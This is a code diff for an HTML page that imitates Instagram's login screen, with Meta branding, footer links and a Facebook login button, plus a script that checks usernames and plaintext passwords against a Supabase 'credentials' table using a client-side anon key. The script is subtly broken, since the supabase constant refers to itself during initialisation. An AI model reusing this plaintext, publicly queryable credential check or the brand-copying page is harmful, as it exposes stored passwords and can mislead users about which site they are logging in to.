@@ -118,6 +118,7 @@
 
         form button:disabled {
             background-color: #004c8c;
+            cursor: not-allowed;
         }
 
         .or-separator {
@@ -291,9 +292,111 @@
                     <input type="password" id="password" placeholder="Password" required>
                     <button type="submit">Log in</button>
                 </form>
+                <div id="message"></div>
                 <div class="or-separator">
                     <span>OR</span>
                 </div>
                 <button class="facebook-login">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M22.676 0H1.324C.593 0 0 .593 0 1.324v21.352C0 23.407.593 24 1.324 24H12.82v-9.294H9.692v-3.622h3.128V8.312c0-3.1 1.895-4.788 4.659-4.788 1.325 0 
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#385185">
+                        <path d="M22.676 0H1.324C.593 0 0 .593 0 1.324v21.352C0 23.407.593 24 1.324 24H12.82v-9.294H9.692v-3.622h3.128V8.312c0-3.1 1.895-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.323-.593 1.323-1.324V1.324C24 .593 23.407 0 22.676 0z"/>
+                    </svg>
+                    Log in with Facebook
+                </button>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            <div class="signup-box">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <ul class="footer-links">
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Instagram Lite</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Contact Uploading & Non-Users</a></li>
+                <li><a href="#">Meta Verified</a></li>
+            </ul>
+            <div class="copyright">© 2025 Instagram from Meta</div>
+        </div>
+    </footer>
+
+    <script>
+        // Initialize Supabase client
+        // Replace these with your actual Supabase credentials
+        const SUPABASE_URL = 'YOUR_SUPABASE_URL'; // e.g., https://xxxxx.supabase.co
+        const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
+        
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Get form elements
+        const loginForm = document.getElementById('loginForm');
+        const messageDiv = document.getElementById('message');
+
+        // Handle form submission
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const submitButton = loginForm.querySelector('button[type="submit"]');
+
+            // Disable button during processing
+            submitButton.disabled = true;
+            submitButton.textContent = 'Logging in...';
+            messageDiv.innerHTML = '';
+
+            try {
+                // Query the credentials table
+                const { data, error } = await supabase
+                    .from('credentials')
+                    .select('*')
+                    .eq('username', username)
+                    .eq('password', password)
+                    .single();
+
+                if (error) {
+                    if (error.code === 'PGRST116') {
+                        // No rows returned - invalid credentials
+                        showMessage('Invalid username or password', 'error');
+                    } else {
+                        showMessage('An error occurred. Please try again.', 'error');
+                        console.error('Supabase error:', error);
+                    }
+                } else if (data) {
+                    // Successful login
+                    showMessage('Login successful!', 'success');
+                    
+                    // Redirect or perform additional actions after successful login
+                    setTimeout(() => {
+                        // Replace with your dashboard or home page URL
+                        window.location.href = 'dashboard.html';
+                    }, 1500);
+                }
+            } catch (err) {
+                showMessage('An unexpected error occurred.', 'error');
+                console.error('Error:', err);
+            } finally {
+                // Re-enable button
+                submitButton.disabled = false;
+                submitButton.textContent = 'Log in';
+            }
+        });
+
+        // Function to display messages
+        function showMessage(text, type) {
+            messageDiv.innerHTML = `<div class="message ${type}">${text}</div>`;
+        }
+    </script>
+</body>
+</html>
